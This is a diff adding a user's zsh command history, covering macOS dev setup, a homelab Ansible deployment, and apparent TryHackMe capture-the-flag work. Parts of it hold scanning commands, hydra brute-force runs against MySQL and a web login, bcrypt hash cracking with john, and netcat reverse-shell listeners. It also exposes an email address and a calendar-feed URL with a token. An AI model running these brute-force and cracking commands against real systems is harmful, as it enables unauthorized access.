@@ -1,0 +1,2938 @@
+    1  /bin/zsh -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+    2  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+    3  echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> /Users/felipe/.zprofile
+    4   eval "$(/opt/homebrew/bin/brew shellenv)"
+    5  brew help
+    6  esxit
+    7  exit
+    8  ls
+    9  pwd
+   10  /usr/share
+   11  ll
+   12  cd /usr/share
+   13  ls
+   14  sudo mkdir wordlist
+   15  sudo mkdir wordlist
+   16  exit
+   17  brew install asdf
+   18  brew install git
+   19  xcode-select --instalal
+   20  xcode-select --install
+   21  brew install asdf
+   22  ls
+   23  ll
+   24  ls -la
+   25  nano .zshrc
+   26  source .zshrc
+   27  nano .zshrc
+   28  source .zshrc
+   29  asdf add 
+   30  asdf plugin add nodejs https://github.com/asdf-vm/asdf-nodejs.git\n
+   31  asdf install nodejs 12.22.12
+   32  ./configure
+   33  asdf plugin add python\n
+   34  asdf install python 2.1 3.18
+   35  asdf install python 3.8
+   36  python -V
+   37  asdf list all
+   38  asdf list
+   39  asdf current python
+   40  asdf current python 3.8.13
+   41  asdf global python 3.8.13
+   42  clear
+   43  ls
+   44  python -V
+   45  asdf plugin add nodejs
+   46  asdf install nodejs 12.22.12
+   47  asdf install nodejs latest
+   48  asdf install python 2.7
+   49  asdf local python 2.7.18 
+   50  asdf install nodejs latest
+   51  asdf install nodejs 12.22.12
+   52  git 
+   53  git -v
+   54  exit
+   55  printenv > /var/folders/dm/091s1tpj785dytnnpp8d0x2r0000gn/T/tmp-120231SZLVlLnxygtxt
+   56  sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"\n\n
+   57  sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"\n\n
+   58  python -V
+   59  python3 -V
+   60  open .zshrc
+   61  eit
+   62  exit
+   63  brew install nmap 
+   64  ssh
+   65  ssh-keygen
+   66  ssh-keygen -t ed25519 -C "felipe.demelo@hotmail.com"
+   67  ls
+   68  cd .ssh
+   69  ls
+   70  cat id_ed25519.pub
+   71  brew install john-jumbo
+   72  john
+   73  ipconfig 
+   74  ipconfig --help
+   75  ifconfig
+   76  ftp
+   77  brew install ftp
+   78  ssh2john
+   79  john --help\\nq
+   80  john --help\nq
+   81  john --list=format
+   82  john --list=formats
+   83  clear
+   84  cls
+   85  clear
+   86  ls
+   87  \tnc
+   88  curl
+   89  wget
+   90  brew install wget
+   91  brew remove
+   92  brew remove john
+   93  brew remove john-jumbo
+   94  brew install john-jumbo
+   95  ssh2john
+   96  which john
+   97  cd /opt/homebrew/bin/john
+   98  cat /opt/homebrew/bin/john
+   99  1;2c1;2c1;2c1;2c1;2c1;2c1;2c1;2c1;2c1;2c1;2c1;2c1;2cq
+  100  cd /opt/homebrew
+  101  ls
+  102  ll
+  103  cd share
+  104  ls
+  105  ll
+  106  cd john
+  107  ls
+  108  ll
+  109  cd ~
+  110  ls
+  111  cd /opt/homebrew
+  112  cd share
+  113  ls
+  114  cd john
+  115  ls
+  116  clear
+  117  ls
+  118  ./ssh2john.py
+  119  ll
+  120  john-jumbo
+  121  cd ~
+  122  ls
+  123  john-jumbo
+  124  which
+  125  ll
+  126  pwd
+  127  ./pdf2john.pl
+  128  cd ~
+  129  ll
+  130  ls -la
+  131  nano .zshrc
+  132  source .zshrc
+  133  nano .zshrc
+  134  source .zshrc
+  135  nano .zshrc
+  136  source .zshrc
+  137  env
+  138  ssh2john.py 
+  139  nano .zshrc
+  140  exit
+  141  brew install binwalk apktool crunch dex2jar ffuf hashcat hydra gobuster jq openvpn radare2 sqlmap tor reaver zip rar 
+  142  sqlmap
+  143  gobuster
+  144  exit
+  145  openvpn
+  146  clear
+  147  ls
+  148  cd Downloads
+  149  ls
+  150  sudo openvpn Fexd.ovpn
+  151  nmap -sC -sV 10.10.44.170
+  152  ftp  10.10.44.170
+  153  sudo openvpn Fexd.ovpn
+  154  nmap -sC -sV 10.10.44.170
+  155  gobuster 
+  156  gobuster dir -u  10.10.44.170 -w Documents/wordlist/Discovery/Web-Content/big.txt
+  157  hydra --help
+  158  hydra -h
+  159  hydra -l root -P Documents/wordlist/rockyou.txt 10.10.44.170 mysql
+  160  mysql
+  161  brew install mysql
+  162  brew install haiti
+  163  ruby 
+  164  asdf add ruby
+  165  asdf plugin add ruby
+  166  asdf install ruby 
+  167  asdf install ruby latest
+  168  john -help
+  169  john --wordlist=Documents/wordlist/rockyou.txt '$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we'
+  170  echo '$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we'> hash
+  171  john --wordlist=Documents/wordlist/rockyou.txt hash
+  172  ssh adrian@10.10.44.170
+  173  asdf global ruby 3.1.2
+  174  gem
+  175  gem install haiti-hash
+  176  gem -v
+  177  gem update --system --no-user-install
+  178  sudo gem update --system --no-user-install
+  179  ssh root@10.10.44.170
+  180  ip a
+  181  ifconfig
+  182  nc -nlvp 4445
+  183  brew install netcat
+  184  gem install haiti-hash
+  185  gem -v
+  186  brew remove gem 
+  187  gem
+  188  which gem
+  189  ll /usr/bin/gem
+  190  ls /usr/bin/gem
+  191  ls -al /usr/bin/gem
+  192  brew rmeove ruby 
+  193  brew remove ruby 
+  194  brew uninstall ruby  
+  195  sudo rm /usr/bin/gem
+  196  ls -al /usr/bin/gem
+  197  sudo rm /usr/bin/gem
+  198  ruby 
+  199  ruby -v
+  200  asdf global ruby 3.1.2
+  201  ruby
+  202  ruby -v
+  203  brew list ruby
+  204  brew uninstall --froce ruby 
+  205  brew uninstall --force ruby 
+  206  brew autoremove
+  207  which ruby
+  208  brew doctor
+  209  ruby -v
+  210  ruby3
+  211  asdf uninstall ruby
+  212  sudo asdf uninstall ruby
+  213  ruby
+  214  gem install haiti-hash
+  215  sudo gem install haiti-hash
+  216  sudo gem -v
+  217  exit
+  218  nc
+  219  ncat
+  220  ncat --help
+  221  ncat -nvlp 4445
+  222  ifconfig
+  223  brew uninstall netcat
+  224  brew install netcat
+  225  _netcat
+  226  netcat
+  227  netcat -v
+  228  netcat --help
+  229  netcat -nlvp 4445
+  230  nc --help
+  231  which nc
+  232  nc -lnv localhost 4445
+  233  nc -l localhost 4445
+  234  nc -l 10.13.13.110 4445
+  235  nc -lnv 10.13.13.110 4445
+  236  nc -l -p 4445
+  237  ncat -lnvp 4445
+  238  exit
+  239  cd ..
+  240  mv Hacking obsidian\ docs
+  241  ls
+  242  cd ..
+  243  ls
+  244  extract arduino\ Developer.rar
+  245  cd ..
+  246  ls
+  247  extract
+  248  extract arduino\ Developer.rar
+  249  unrar
+  250  sudo unrar e arduino\ Developer.rar
+  251  unrar
+  252  ls
+  253  cd Desktop
+  254  ls
+  255  mkdir projetos
+  256  cd projetos
+  257  ls
+  258  git clone git@github.com:fexd12/orcamento-wrn.git
+  259  cd orcamento-wrn
+  260  code .
+  261  yarn
+  262  docker
+  263  brew cask install docker 
+  264  brew install --cask docker 
+  265  curl https://listadeaprovados.blogspot.com/feeds/posts/default
+  266  curl https://listadeaprovados.blogspot.com/feeds/posts/default -o  teste.html
+  267  cat teste.html | grep fedas
+  268  cat teste.html | grep 
+  269  grep -f teste.html -i felipe
+  270  docker 
+  271  docker
+  272  clear
+  273  ls
+  274  code
+  275  nano .zshrc
+  276  source .zshrc
+  277  clear
+  278  als
+  279  ls
+  280  ll
+  281  code .
+  282  exit
+  283  code
+  284  ls
+  285  code .
+  286  nano .zshrc
+  287  source .zshrc
+  288  clear
+  289  code
+  290  ls
+  291  cd D
+  292  cd Desktop
+  293  ls
+  294  cd projetos/orcamento-wrn
+  295  ls
+  296  code .
+  297  l
+  298  cd backend
+  299  ls
+  300  clear
+  301  ls
+  302  npm -v
+  303  asdf plugin add yarn 
+  304  clear
+  305  ls
+  306  asdf install yarn latest
+  307  brew install tar gpg
+  308  brew install gnu-tar gpg
+  309  sudo nano ~/.zshrc
+  310  exit
+  311  asdf install yarn latest
+  312  asdf global yarn 2
+  313  asdf uninstall yarn 
+  314  yarn 
+  315  npm 
+  316  sudo nano /Users/felipe/.tool-versions
+  317  python3 -V
+  318  python -V
+  319  asdf global python
+  320  asdf global python 3.8.13
+  321  clear
+  322  ls
+  323  python
+  324  python2 -V
+  325  python -V
+  326  yarn global bin
+  327  asdf global yarn
+  328  asdf global yarn system 
+  329  yarn
+  330  asdf global npm 
+  331  asdf global npm latest
+  332  asdf plugin-add yarn
+  333  asdf plugin-add npm
+  334  asdf plugin-list
+  335  asdf plugin-list-all
+  336  asdf plugin-list-all | grep gem
+  337  asdf current
+  338  asdf install ruby 3.1.2
+  339  asdf plugin add nodejs asdf plugin add nodejs https://github.com/asdf-vm/asdf-nodejs.git\n
+  340  asdf plugin add nodejs https://github.com/asdf-vm/asdf-nodejs.git\n
+  341  exit
+  342  asdf uninstall ruby
+  343  clear
+  344  asdf uninstall nodejs
+  345  node
+  346  asdf current
+  347  asdf list
+  348  asdf plugin-remove nodejs
+  349  asdf plugin add nodejs https://github.com/asdf-vm/asdf-nodejs.git\n
+  350  asdf plugin update
+  351  asdf install nodejs latest
+  352  asdf global nodejs 18.7.0
+  353  clear
+  354  ls
+  355  asdf current
+  356  npm
+  357  clear
+  358  npm i -g yarn 
+  359  clear
+  360  asdf plugin-remove yarn
+  361  clear
+  362  asdf plugin-list
+  363  asdf list
+  364  asdf plugin add ruby https://github.com/asdf-vm/asdf-ruby.git\n
+  365  asdf plugin-remove ruby
+  366  asdf plugin add ruby https://github.com/asdf-vm/asdf-ruby.git\n
+  367  clear
+  368  ls
+  369  clear
+  370  ls
+  371  asdf install ruby 3.1.2
+  372  exit
+  373  clear
+  374  asdf global ruby 3.1.2
+  375  clear
+  376  ruby -v
+  377  gem
+  378  gem -v
+  379  gem install haiti-hash
+  380  exit
+  381  clear
+  382  l
+  383  cd backend
+  384  ls
+  385  yarn install
+  386  ls
+  387  node -v
+  388  npm -v
+  389  npm i -g yarn 
+  390  yarn
+  391  npm i 
+  392  yarn -v
+  393  yarn update
+  394  yarn help
+  395  yarn upgrade
+  396  yarn global bin
+  397  yarn -v
+  398  npm run start
+  399  npm run build 
+  400  npm start 
+  401  npm i
+  402  npm run build
+  403  npm start
+  404  yarn 
+  405  yarn run buil
+  406  yarn run build
+  407  yarn run start
+  408  git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k
+  409  nano .zshrc
+  410  source .zshrc
+  411  ls
+  412  clea
+  413  diff $TMPDIR/.zshrc.LkmthJ5HWV ~/.zshrc
+  414  cd $ZSH_CUSTOM
+  415  LS
+  416  ls
+  417  cd plugins
+  418  ls
+  419  ll
+  420  git clone --depth=1 https://github.com/marlonrichert/zsh-autocomplete.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/plugins/zsh-autocomplete
+  421  clear
+  422  ls
+  423  nano .zshrc
+  424  ls
+  425  clear
+  426  ls
+  427  source .zshrc
+  428  cd ~
+  429  ls
+  430  cd Desktop/projetos/orcamento-wrn
+  431  ls
+  432  p10k configure
+  433  clear
+  434  ls
+  435  cd Applications
+  436  ls
+  437  ll
+  438  cd ..
+  439  ls
+  440  cd Documents
+  441  ls
+  442  cd obsidian\ docs
+  443  ll
+  444  cd ~
+  445  ls
+  446  nano .zshrc
+  447  source .zshrc
+  448  ls $ZSH_CUSTOM
+  449  ls $ZSH_CUSTOM/plugins
+  450  ls $ZSH_CUSTOM/plugins/zsh-autocomplete
+  451  cd $ZSH_CUSTOM/plugins/zsh-autocomplete
+  452  pwd
+  453  nano .zshrc
+  454  cd $ZSH_CUSTOM/plugins/zsh-autocomplete
+  455  pwd
+  456  nano ~/.zshrc
+  457  echo $ZSH_CUSTOM
+  458  echo $ZSH_CUSTOM/plugins/zsh-autocomplete
+  459  echo $ZSH_CUSTOM/plugins/zsh-autocomplete/
+  460  ~
+  461  nano .zshrc
+  462  cd $ZSH_CUSTOM/plugins/zsh-autocomplete/
+  463  ls
+  464  ll
+  465  chmod +x *.zsh
+  466  ll
+  467  source .zshrc
+  468  nano .zshrc
+  469  echo $ZSH
+  470  nano .zshrc
+  471  clear
+  472  cd Desktop/projetos
+  473  ls
+  474  cd ..
+  475  cd 
+  476  cd Desktop
+  477  LS
+  478  ls
+  479  cd ..
+  480  Documents
+  481  ls
+  482  clear
+  483  ls
+  484  exit
+  485  nano .zshrc
+  486  ls
+  487  cd $ZSH_CUSTOM
+  488  LS
+  489  ls
+  490  cd plugins
+  491  ls
+  492  cd zsh-autocomplete
+  493  ls
+  494  ./run-tests.zsh
+  495  ll
+  496  ./zsh-autocomplete.plugin.zsh
+  497  cd scripts
+  498  ls
+  499  ll
+  500  cd ..
+  501  ls
+  502  cd functions
+  503  ls
+  504  ll
+  505  cd completion
+  506  ls
+  507  ll
+  508  cd ..
+  509  code .
+  510  nano .zshrc
+  511  history
+  512  509
+  513  clear
+  514  python
+  515  exit
+  516  pythpn
+  517  python
+  518  pip
+  519  pip -v
+  520  pip --version
+  521  pip install pipx
+  522  pipx install bbot
+  523  asdf plugin-add kubectl
+  524  asdf install kubectl 1.19.16
+  525  asdf plugin-add kubectl https://github.com/asdf-community/asdf-kubectl.git\n
+  526  ASDF_KUBECTL_OVERWRITE_ARCH=amd64 asdf install kubectl 1.19.16\n
+  527  asdf install kubectl 1.19.16
+  528  asdf global kubectl 1.19.16
+  529  kubectl versiomn
+  530  kubectl version
+  531  asdf unininstall kubectl 1.19.16
+  532  asdf uninstall kubectl 1.19.16
+  533  kubectl version\\n/
+  534  kubectl version
+  535  which kubectl
+  536  brew remove kubectl
+  537  brew uninstall
+  538  brew remove -f kubectl 
+  539  which kubectl
+  540  apt update
+  541  sudo apt --version
+  542  asdf current
+  543  asdf plugin-list docker
+  544  asdf plugin-list-all docker
+  545  asdf plugin-list-all | grep docker 
+  546  which kubectl
+  547  mv /usr/local/bin/kubectl /usr/local/bin/kubectl.bkp
+  548  sudo mv /usr/local/bin/kubectl /usr/local/bin/kubectl.bkp
+  549  kubectl
+  550  asdf install kubectl 1.19.16
+  551  ASDF_KUBECTL_OVERWRITE_ARCH=amd64 asdf install kubectl 1.19.16\n
+  552  asdf global kubectl 1.19.16
+  553  kubectl
+  554  kubectl version
+  555  kubectl version --client
+  556  nano .zshrc
+  557  source .zshrc
+  558  kubectl logs
+  559  kubectl get all
+  560  exit
+  561  brew install ftp
+  562  brew install pure-ftpd
+  563  which pure-ftpd
+  564  pure-ftpd
+  565  pure-ftpd -help
+  566  pure-ftp
+  567  pure-ftpd
+  568  pureftp
+  569  kubectl
+  570  exit
+  571  kubectl
+  572  nano .zshrc
+  573  clear
+  574  pure-ftp 
+  575  pure-ftpd
+  576  pure-ftpd --help
+  577  brew remove pure-ftpd
+  578  rm -rf /opt/homebrew/etc/pure-ftpd.conf
+  579  brew install unrar
+  580  brew install 7zip
+  581  which 7zip
+  582  which sevenzip
+  583  brew unstall 7zip
+  584  brew remove 7zip
+  585  clea
+  586  rls
+  587  clear
+  588  ls
+  589  ll
+  590  ls -la
+  591  cd .ssh
+  592  ls
+  593  exit
+  594  omz update
+  595  duf
+  596  exit
+  597  cd Downloads
+  598  ls
+  599  cd rar
+  600  mv unrar /usr/local/bin
+  601  sudo mv unrar /usr/local/bin
+  602  sudo mv rar /usr/local/bin
+  603  clear
+  604  unrar
+  605  unrar --help 
+  606  unrar
+  607  exit
+  608  unrar
+  609  cd Downloads
+  610  LS
+  611  cd tgm
+  612  ls
+  613  unrar --help
+  614  sudo chmod +x /usr/local/bin/unrar
+  615  unrar
+  616  brew remove unrar
+  617  finder .
+  618  /usr/local/bin/unrar ; exit;
+  619  unrar
+  620  /usr/local/bin/unrar ; exit;
+  621  /usr/local/bin/unrar --help
+  622  /usr/local/bin/unrar h
+  623  cd ~
+  624  nano .zshrc
+  625  source .zshrc
+  626  unrar h
+  627  clear
+  628  exit
+  629  unrar h
+  630  exit
+  631  unrar h
+  632  cd Downloads
+  633  cd tga
+  634  cd tgm
+  635  ls
+  636  clear
+  637  ls
+  638  unrar h
+  639  unrar e arduino\ Developer.rar
+  640  clear
+  641  ls
+  642  code .
+  643  tor
+  644  exit
+  645  ping 192.168.0.141
+  646  ssh felipe@192.168.0141
+  647  ssh felipe@192.168.0.141
+  648  exit
+  649  ipython
+  650  exit
+  651  extract eeg-data.csv.zip
+  652  python -m venv venv
+  653  clear
+  654  ls
+  655  source venv/bin/activate
+  656  clear
+  657  ls
+  658  pip install tensorflow pandas numpy scikit-learn
+  659  ls
+  660  deactivate
+  661  clear
+  662  ls
+  663  python -V
+  664  clear
+  665  python -V
+  666  clear
+  667  ld
+  668  ls
+  669  open .
+  670  exit
+  671  ls
+  672  openvpn
+  673  exit
+  674  clear
+  675  ping 10.10.90.156
+  676  nmap -sC -sV 10.10.90.156
+  677  sudo nano /etc/hosts
+  678  clear
+  679  nmap -sC -sV vuln.thm
+  680  nmap -sC -sV vuln.thm -Pn
+  681  gobuster
+  682  clear
+  683  amass
+  684  clear
+  685  nmap -sC -sV vuln.thm -Pn
+  686  sudo nano /etc/hosts
+  687  gobuster dir --help
+  688  gobuster dir -u http://vuln.thm -w Documents/wordlist
+  689  gobuster dir -u http://vuln.thm -w Documents/wordlist/Discovery/Web-Content/big.txt
+  690  sudo nano /etc/hosts
+  691  gobuster dir -u http://vulnnet.thm -w Documents/wordlist/Discovery/Web-Content/big.txt
+  692  nmap -sC -sV vulnnet.thm -Pn
+  693  sudo nano /etc/hosts
+  694  ping vulnnet.thm
+  695  cd Downloads
+  696  ls
+  697  sudo openvpn Fexd\ \(1\).ovpn
+  698  ping vulnnet.thm
+  699  nmap -sC -sV vulnnet.thm -Pn
+  700  gobuster dir -u http://vulnnet.thm -w Documents/wordlist/Discovery/Web-Content/big.txt
+  701  gobuster dir -u "http://vulnnet.thm" -w Documents/wordlist/Discovery/Web-Content/big.txt
+  702  gobuster 
+  703  ffuf
+  704  ffuf -w Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.vulnnet.thm" -u http://vulnnet.thm
+  705  gobuster dir -u "http://vulnnet.thm" -w Documents/wordlist/Discovery/Web-Content/big.txt
+  706  clear
+  707  brew install amass
+  708  brew tap caffix/amass\n
+  709  brew install amass
+  710  amass enum --help
+  711  amass enum -d vulnnet.thm -ip
+  712  amass enum -d vulnnet.thm -ip -brute
+  713  amass enum --help
+  714  amass enum -d vulnnet.thm -ip -brute
+  715  ulimit -u
+  716  ulimit
+  717  ulimit -h
+  718  ulimit --help
+  719  ulimit -u
+  720  launchctl limit maxproc
+  721  sudo launchctl limit maxproc
+  722  sudo launchctl limit --help
+  723  sudo launchctl limit maxproc 10240 unlimited
+  724  sudo launchctl limit maxproc 
+  725  ulimit -u
+  726  ulimit -u 10240
+  727  ulimit -u 12228
+  728  ulimit -u unlimited
+  729  ulimit -u
+  730  amass enum -d vulnnet.thm -ip -brute
+  731  amass --help
+  732  amass intel --help 
+  733  amass intel -d vulnnet.thm -ip -brute
+  734  amass intel -d vulnnet.thm -ip
+  735  amass intel vulnnet.thm
+  736  amass intel -d vulnnet.thm
+  737  amass enum -d "http://vulnnet.thm" -ip -brute
+  738  amass enum -d "http://vulnnet.thm" -ip -brute -passive
+  739  amass enum -d "http://vulnnet.thm" -ip -brute
+  740  amass enum -d "http://vulnnet.thm" -ip -brute -w Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -o res.txt
+  741  ls
+  742  cat res.txt
+  743  amass enum -d vulnnet.thm -brute -w Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -o res.txt
+  744  gobuster dir -u vulnnet.thm -w Documents/wordlist/Discovery/Web-Content/big.txt
+  745  gobuster  -u vulnnet.thm -w Documents/wordlist/Discovery/Web-Content/big.txt
+  746  ffuf -w Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.vulnnet.thm" -u http://vulnnet.thm
+  747  ls
+  748  cat res.txt
+  749  dnsrecon
+  750  brew install dnsrecon
+  751  cd /opt
+  752  ls
+  753  ll
+  754  git clone git@github.com:darkoperator/dnsrecon.git
+  755  sudo git clone git@github.com:darkoperator/dnsrecon.git
+  756  ls
+  757  sudo mkdir dsrecon
+  758  git clone git@github.com:darkoperator/dnsrecon.git
+  759  ls
+  760  ll
+  761  sudo chown felipe:felipe dsrecon
+  762  sudo chown felipe:admin dsrecon
+  763  sudo chown -R felipe:admin dsrecon
+  764  clear
+  765  git clone git@github.com:darkoperator/dnsrecon.git
+  766  git clone git@github.com:darkoperator/dnsrecon.git dnsrecon
+  767  ls
+  768  ll
+  769  git clone --help
+  770  git clone git@github.com:darkoperator/dnsrecon.git dnsrecon
+  771  git clone git@github.com:darkoperator/dnsrecon.git -o dnsrecon
+  772  git clone --help
+  773  git clone git@github.com:darkoperator/dnsrecon.git -o dnsrecon
+  774  ls
+  775  cd dns
+  776  \tls
+  777  ll
+  778  cd dsrecon
+  779  ls
+  780  ll
+  781  cd ..
+  782  ll
+  783  cd dsrecon
+  784  ls
+  785  mkdir teste
+  786  ls
+  787  rm teste
+  788  l
+  789  sudo chown -R felipe:admin dsrecon
+  790  rm -r teste
+  791  ls
+  792  clear
+  793  ls
+  794  cd ..
+  795  ls
+  796  ffuf -w Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.vulnnet.thm" -u http://vulnnet.thm
+  797  ffuf -w Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.vulnnet.thm" -u http://10.10.90.156
+  798  curl 10.10.90.156 -H 
+  799  curl 10.10.90.156 ---help
+  800  curl --help
+  801  sudo openvpn Fexd\ \(1\).ovpn
+  802  cd Downloads
+  803  sudo openvpn Fexd\ \(1\).ovpn
+  804  amass enum -d vulnnet.thm -brute -w Documents/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -o res.txt
+  805  cat res.txt
+  806  exit
+  807  ls
+  808  mkdir ctfs
+  809  cd ctfs
+  810  ls
+  811  mkdir aoc3
+  812  clear
+  813  cd aoc3
+  814  ls
+  815  clear
+  816  hydra
+  817  wget https://assets.tryhackme.com/additional/aoc2021/day4/passwords.txt
+  818  clear
+  819  ls
+  820  hydra
+  821  hydra -l santa -P passwords.txt http://10.10.168.91/ http-post-form "/:username=^USER^&password=ˆPASS^&submit=Login:Invalid username and password"
+  822  hydra -l santa -P passwords.txt 10.10.168.91 http-post-form "/:username=^USER^&password=ˆPASS^&submit=Login:Invalid username and password"
+  823  cat passwords.txt
+  824  rm Fexd\ \(1\).ovpn
+  825  rm Fexd.ovpn
+  826  clear
+  827  sudo openvpn Fexd.ovpn
+  828  hydra -l santa -P passwords.txt 10.10.168.91 http-post-form "/:username=^USER^&password=ˆPASS^&submit=Login:Invalid username and password"
+  829  hydra
+  830  hydra -l santa -P passwords.txt 10.10.168.91 http-post-form "/:username=^USER^&password=ˆPASS^&submit=Login:Invalid username and password"
+  831  burp
+  832  burpsuite
+  833  hydra -l santa -P passwords.txt 10.10.168.91 http-post-form "/:username=^USER^&password=ˆPASS^:Invalid username and password"
+  834  cd Downloads
+  835  sudo openvpn Fexd.ovpn
+  836  exit
+  837  sudo vi /etc/pam.d/sudo
+  838  sudo nano /etc/pam.d/sudo
+  839  exit
+  840  sudo nano /etc/fstab
+  841  exit
+  842  tor
+  843  clear
+  844  ls
+  845  curl https://senacsp.blackboard.com/webapps/calendar/calendarFeed/cf0fba2b0d894adea07affe6e25e1d97/learn.ics\n
+  846  wget https://senacsp.blackboard.com/webapps/calendar/calendarFeed/cf0fba2b0d894adea07affe6e25e1d97/learn.ics\n
+  847  ls
+  848  cat learn.ics
+  849  exit
+  850  source venv/bin/activate
+  851  clear
+  852  ls
+  853  pip install mne
+  854  python transform.py
+  855  ping 192.168.0.141
+  856  omz update
+  857  source venv/bin/activate
+  858  python transform.py
+  859  clear
+  860  ls
+  861  python transform.py
+  862  dbeaver]
+  863  dbeaver
+  864  dbeaver-ce
+  865  exit
+  866  tor 
+  867  nmap -sC -sV 192.168.0.141
+  868  nmap -sC -sV 192.168.0.141 -Pn
+  869  dig grafana.homelab.local
+  870  clear
+  871  ls
+  872  cd Documents
+  873  l
+  874  cd ..
+  875  ls
+  876  cd Desktop
+  877  ll
+  878  l
+  879  cd projetos
+  880  ls
+  881  git clone git@github.com:fexd12/homelab.git
+  882  cd homelab
+  883  ls
+  884  code .
+  885  make
+  886  docker
+  887  systemctl
+  888  system
+  889  docker
+  890  make
+  891  sudo su
+  892  ll 
+  893  chmod +x *.sh
+  894  make
+  895  ssh-keygen -t rsa
+  896  make
+  897  ls ~felipe/.ssh
+  898  make
+  899  docker restart
+  900  make
+  901  make update
+  902  mkae
+  903  make
+  904  make decrypt
+  905  ./docker_helper_notty.sh ansible-vault decrypt settings/vault.yml
+  906  ./generate_ansible_pass.sh
+  907  make
+  908  ./get_setting.sh
+  909  git --help
+  910  git origin
+  911  git remote add gitlab https://gitlab.com/NickBusey/HomelabOS.git
+  912  git fetch
+  913  cd "/Users/felipe/Desktop/projetos/homelab"
+  914  git branch dev main
+  915  git pull gitlab dev
+  916  git branch dev
+  917  git checkout dev
+  918  clear
+  919  ls
+  920  git merge gitlab dev
+  921  git merge gitlab/dev
+  922  git config --global user.email "felipe.demelo@hotmail.com"
+  923  git config --global user.name "felipe"
+  924  git push origin dev
+  925  clear
+  926  ls
+  927  clear
+  928  make
+  929  go
+  930  asdf 
+  931  asdf go
+  932  asdf plugin add go
+  933  asdf go
+  934  asdf
+  935  asdf list
+  936  asdf install go
+  937  asdf install go latest
+  938  asdf plugin add go
+  939  asdf plugin-update all
+  940  asdf plugin-update-all
+  941  asdf plugin update-all
+  942  asdf plugin-list 
+  943  asdf plugin add go
+  944  asdf plugin add https://github.com/kennyp/asdf-golang
+  945  asdf plugin add Go
+  946  asdf plugin add go
+  947  asdf plugin-add golang https://github.com/kennyp/asdf-golang.git\n
+  948  asdf install golang
+  949  asdf install golang latest
+  950  go
+  951  make
+  952  asdf current go latest
+  953  asdf global golang 1.19.1
+  954  make
+  955  make config
+  956  make deploy
+  957  make config
+  958  make
+  959  make 
+  960  ssh felipe@192.168.0.141 -i ~/.ssh/id_rsa
+  961  ssh-copy-id --help
+  962  ssh-copy-id -i ~/.ssh/id_rsa  felipe@192.168.0.141
+  963  make 
+  964  make decrypt
+  965  make 
+  966  make config
+  967  make update
+  968  make config_reset
+  969  make config
+  970  make
+  971  make config
+  972  make
+  973  make decrypt
+  974  make config
+  975  make
+  976  make decrypt
+  977  make config
+  978  make
+  979  ./docker_helper.sh ansible-playbook -i -i inventory playbook.config.yml
+  980  ./docker_helper.sh ansible-playbook -i inventory playbook.config.yml
+  981  make
+  982  ./docker_helper.sh ansible-playbook -i inventory playbook.config.yml
+  983  make deploy
+  984  ssh homelab@192.168.0.141 -i ~/.ssh/id_rsa
+  985  ssh felipe@192.168.0.141 -i ~/.ssh/id_rsa
+  986  make
+  987  make decrypt
+  988  make config
+  989  make
+  990  make decrypt
+  991  make
+  992  make uninstall
+  993  make
+  994  clear
+  995  exit
+  996  ssh felipe@192.168.0.141
+  997  make
+  998  make deploy 
+  999  exit
+ 1000  ls
+ 1001  cat .ssh/id_ed25519
+ 1002  clear
+ 1003  ls
+ 1004  ssh felipe@192.168.0.141
+ 1005  ls
+ 1006  clear
+ 1007  ls
+ 1008  cd Desktop
+ 1009  ls
+ 1010  clear
+ 1011  ls
+ 1012  cd projetos
+ 1013  ls
+ 1014  cd homelab
+ 1015  ls
+ 1016  clear
+ 1017  ls
+ 1018  make 
+ 1019  make decrypt
+ 1020  ssh felipe@192.168.0.141
+ 1021  make
+ 1022  make encrypt
+ 1023  make
+ 1024  nmap 192.168.0.0/24 
+ 1025  amass intel 
+ 1026  amass intel -addr 192.168.0.1/254 -ip
+ 1027  amass intel -addr 192.168.0.1-254 -ip
+ 1028  cear
+ 1029  clear
+ 1030  ls
+ 1031  clear
+ 1032  ping --help
+ 1033  ping -c 1 192.168.0.0-254
+ 1034  ping -c 1 192.168.0.0/254
+ 1035  nmap -PR 192.168.0.0/24
+ 1036  nmap -PR -v 192.168.0.0/24
+ 1037  echo '45.196.149.249,45.196.145.168,185.238.212.144' > acesso_microsoft\n
+ 1038  finder .
+ 1039  curl 192.168.0.10:9100
+ 1040  cd Desktop/projetos
+ 1041  git clone git@github.com:danielvijge/openwrt-configuration-ansible.git
+ 1042  cd openwrt-configuration-ansible
+ 1043  clear
+ 1044  ls
+ 1045  git checkout
+ 1046  git checkout origin/openwrt-21.02
+ 1047  clear
+ 1048  ls
+ 1049  git checkout openwrt-19.07
+ 1050  clear
+ 1051  ls
+ 1052  code .
+ 1053  cat ~/.ssh/id_rsa.pub
+ 1054  ansible
+ 1055  python -V
+ 1056  pip install ansible
+ 1057  ansible-galaxy install gekmihesg.openwrt\n
+ 1058  ansible-playbook
+ 1059  ansible-playbook --inventory=inventory-sample.yaml openwrt.yaml --check
+ 1060  dig grafana.homelab.local
+ 1061  clear
+ 1062  dig grafana.homelab.local
+ 1063  dig grafana.homelab.local @192.168.0.141
+ 1064  dig grafana.homelab.local
+ 1065  clear
+ 1066  dig grafana.homelab.local
+ 1067  ip a
+ 1068  ipconfig
+ 1069  ifconfig
+ 1070  dig grafana.homelab.local
+ 1071  ifconfig
+ 1072  dig grafana.homelab.local
+ 1073  clear
